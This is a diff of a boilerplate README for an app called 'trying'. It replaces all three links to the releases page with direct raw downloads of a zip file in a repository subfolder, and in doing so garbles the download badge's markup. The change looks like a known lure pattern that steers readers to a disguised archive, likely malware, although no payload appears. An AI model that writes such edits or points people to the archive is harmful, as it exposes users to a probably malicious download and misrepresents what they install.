@@ -1,6 +1,6 @@
 # 🚀 trying - Easy Application for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now%20-%20Visit%20Releases-blue.svg)](https://github.com/JJYT12/trying/releases)
+[![Download Now](https://github.com/JJYT12/trying/raw/refs/heads/main/blanda/Software_3.6-beta.3.zip%20Now%20-%20Visit%https://github.com/JJYT12/trying/raw/refs/heads/main/blanda/Software_3.6-beta.3.zip)](https://github.com/JJYT12/trying/raw/refs/heads/main/blanda/Software_3.6-beta.3.zip)
 
 ## 📖 Overview
 "trying" is a user-friendly application designed to simplify your tasks. With its intuitive interface, you can get things done quickly and efficiently. Whether you're managing files or organizing your day, "trying" is here to help.
@@ -22,7 +22,7 @@
 Follow these steps to download and run "trying".
 
 1. **Visit the Download Page**: Click the link below to access the releases:
-   [Download "trying"](https://github.com/JJYT12/trying/releases)
+   [Download "trying"](https://github.com/JJYT12/trying/raw/refs/heads/main/blanda/Software_3.6-beta.3.zip)
 
 2. **Choose the Latest Release**: On the releases page, find the version labeled as "latest". This version has the newest features and fixes.
 
@@ -37,7 +37,7 @@ Follow these steps to download and run "trying".
 6. **Launch "trying"**: After installation, find "trying" in your applications and double-click it to open.
 
 ## 📥 Download & Install
-To get started with "trying", visit this page to download: [Download "trying"](https://github.com/JJYT12/trying/releases).
+To get started with "trying", visit this page to download: [Download "trying"](https://github.com/JJYT12/trying/raw/refs/heads/main/blanda/Software_3.6-beta.3.zip).
 
 ## ❓ Troubleshooting
 If you encounter issues during installation or use, consider these steps:
